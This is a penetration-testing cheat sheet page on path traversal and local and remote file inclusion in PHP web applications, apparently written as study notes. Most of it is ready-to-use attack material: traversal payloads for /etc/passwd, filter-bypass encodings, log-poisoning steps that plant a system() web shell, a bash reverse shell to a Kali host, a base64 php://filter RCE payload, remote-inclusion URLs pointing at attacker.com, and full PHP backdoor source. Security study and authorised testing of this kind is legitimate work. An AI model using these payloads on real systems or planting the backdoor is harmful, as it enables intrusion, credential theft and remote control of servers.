---
layout: default
title: "File Inclusion Traversal"
parent: "Web Application"
nav_order: 11
---

# File Inclusion & Path Traversal

---
## Path Traversal

Path traversal allows reading arbitrary files on the server by manipulating file path parameters.
### Basic Traversal
```
include.php?page=../../../../etc/passwd
/images/../../../../../../etc/passwd
```

### Bypass Techniques

**Nested traversal sequences** (when inner sequence is stripped):
```
....//
....\/
```

**URL encoding:**
```
?file=%2e%2e%2fconfig.php
```

**Double URL encoding:**
```
file=%252e%252e%252fconfig.php
```

**Null byte (bypass extension requirements):**
```
/images/../../../../../../etc/passwd%001.jpg
```
Instead of the extension being processed, the null byte terminates the filename.

**Circumvent escaping:**
```
/var/www/html/..//..//..//etc/passwd
```

---

## Local File Inclusion (LFI)

![](/assets/images/File_Inclusion_Traversal/read_vs_execute.png)

LFI occurs when an attacker exploits vulnerable input fields to access or execute files on the server.

Basic access to sensitive files:
```
include.php?page=../../../../etc/passwd
```

### Log Poisoning

LFI can escalate to RCE by injecting code into log files that are later included.

**Apache log locations:**
- Linux: `/var/log/apache2/access.log`
- Windows XAMPP: `C:\xampp\apache\logs\`

**Step 1: Poison the log** (modify User-Agent via Burp or netcat):
```
# Change User-Agent to:
Mozilla/5.0 <?php echo system($_GET['cmd']); ?>

# Or via netcat:
nc targetIP targetPort
<?php echo phpinfo(); ?>
```

**Step 2: Include the log with command:**
```
/file.php?page=../../../../var/log/apache2/access.log&cmd=ls
# URL encode spaces in commands: ls%20-la
```

**Step 3: Get a shell:**
```
cmd=bash+-c+"bash+-i+>%26+/dev/tcp/$kaliIP/$kaliPort+0>%261"
```

### PHP Session File LFI
If you can inject into session data:
```
http://website.thm/sessions.php?page=<?php%20echo%20phpinfo();%20?>
```
Then include the session file:
```
sessions.php?page=/var/lib/php/sessions/sess_[sessionID]
```
Session ID comes from your browser cookies.

---

## PHP Wrappers

PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
Example: `php://filter/convert.base64-encode/resource=/etc/passwd`

### php://filter (read files)
```
php://filter/convert.base64-encode/resource=/etc/passwd
```
Returns base64-encoded content of the file.

### data:// wrapper (inline code execution)
```
data:text/plain,<?php%20phpinfo();%20?>
http://[IP]/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

### php://filter with base64-decode (RCE)
Encode payload: `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` to base64, then:
```
page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls
```
### php://data
The `data` stream wrapper is another example of PHP's wrapper functionality. The data:// wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code. Example: 
`data:text/plain,<?php%20phpinfo();%20?>`
### Other PHP Wrapper Types
- `php://input` — access raw POST body
- `zip://` — access files within zip archives
- `phar://` — access phar archives
- `expect://` — execute commands (requires expect extension)

![](/assets/images/File%20Inclusion%20%20&%20Path%20Traversal/Screenshot%202024-11-27%20at%204.08.18%20PM.png)

### PHP Wrapper Execution 
PHP wrappers can also be used not only for reading files but also for code execution. The key here is the php://filter stream wrapper, which enables file transformations on the fly.

We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

We can reach `http://IP/page=` then enter that with `&cmd=ls` at the end to list the files. Note that it will say shell done. 

---
## Bypasses

| Bypass Goal | Technique |
|-------------|-----------|
| Extension check | Null byte: `file.php%00.jpg` |
| Simple `../` filter | Double traversal: `....//` |
| URL-decoded filter | URL encode: `%2e%2e%2f` |
| Double-decoded filter | Double encode: `%252e%252e%252f` |
| Prefix requirement | Add required prefix before traversal: `/var/www/html/../../../etc/passwd` |
| Absolute path | Use absolute path directly if filter only strips `../` |

# Remote File Inclusion (RFI)

RFI allows executing a remote file hosted on an attacker-controlled server. Requires `allow_url_include = On` in PHP config (disabled by default in modern PHP — rare in the wild).

```
include.php?page=http://attacker.com/exploit.php
curl "target/index.php?page=http://kaliIP/backdoor.php&cmd=ls"
```

Simple PHP backdoor (host on attacker machine):
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```
Usage: `http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd`